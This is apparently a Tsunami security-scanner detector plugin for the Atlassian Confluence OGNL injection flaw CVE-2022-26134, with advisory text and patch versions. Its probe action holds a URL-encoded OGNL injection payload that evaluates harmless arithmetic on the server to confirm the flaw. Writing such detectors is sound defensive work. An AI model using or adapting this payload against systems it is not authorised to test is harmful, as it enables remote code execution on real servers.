# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "Confluence_CVE_2022_26134"
  author: "Google"
  version: "1.0"
}

finding: {
  main_id: {
    publisher: "GOOGLE"
    value: "CVE_2022_26134"
  }
  severity: CRITICAL
  title: "Atlassian Confluence OGNL Injection RCE (CVE-2022-26134)"
  description:
    "An unauthenticated remote OGNL injection vulnerability in Atlassian "
    "Confluence Server and Data Center (com.opensymphony.xwork.ActionChainResult "
    "namespace evaluation) allows remote attackers to execute arbitrary code "
    "without authentication on versions 1.3.0 before 7.4.17, 7.13.x before "
    "7.13.7, 7.14.x before 7.14.3, 7.15.x before 7.15.2, 7.16.x before 7.16.4, "
    "7.17.x before 7.17.4, and 7.18.x before 7.18.1."
  recommendation:
    "Upgrade Atlassian Confluence Server or Data Center to a patched release "
    "(7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1, or later). See "
    "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html "
    "for remediation details."
  related_id: {
    publisher: "CVE"
    value: "CVE-2022-26134"
  }
}

config: {}

###########
# ACTIONS #
###########

# Probes both the root path and /longrunningtask.action (an administrator-gated
# default-package WebWork action that triggers PermissionCheckInterceptor ->
# "notpermitted" ActionChainResult even when anonymous wiki read access is
# enabled), across both "/" and "/confluence" context roots. Evaluates pure
# in-JVM OGNL integer multiplication via ServletActionContext.getResponse()
# without spawning OS processes or depending on external callback egress.
actions: {
  name: "probe_ognl_namespace_evaluation"
  http_request: {
    method: GET
    uri: [
      "/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22{{ CHECK_HEADER }}%22%2C%22tsunami%22%2B%28{{ FACTOR_A }}*{{ FACTOR_B }}%29%29%7D/",
      "/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22{{ CHECK_HEADER }}%22%2C%22tsunami%22%2B%28{{ FACTOR_A }}*{{ FACTOR_B }}%29%29%7D/longrunningtask.action",
      "/confluence/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22{{ CHECK_HEADER }}%22%2C%22tsunami%22%2B%28{{ FACTOR_A }}*{{ FACTOR_B }}%29%29%7D/",
      "/confluence/%24%7B%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22{{ CHECK_HEADER }}%22%2C%22tsunami%22%2B%28{{ FACTOR_A }}*{{ FACTOR_B }}%29%29%7D/longrunningtask.action"
    ]
    client_options: {
      disable_follow_redirects: true
    }
    response: {
      expect_all: {
        conditions: [
          {
            header: { name: "{{ CHECK_HEADER }}" }
            contains: "tsunami{{ EXPECTED_PRODUCT }}"
          }
        ]
      }
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
  variables: [
    { name: "CHECK_HEADER" value: "X-Confluence-Check" },
    { name: "FACTOR_A" value: "41827" },
    { name: "FACTOR_B" value: "39163" },
    { name: "EXPECTED_PRODUCT" value: "1638070801" }
  ]
  actions: [
    "probe_ognl_namespace_evaluation"
  ]
}
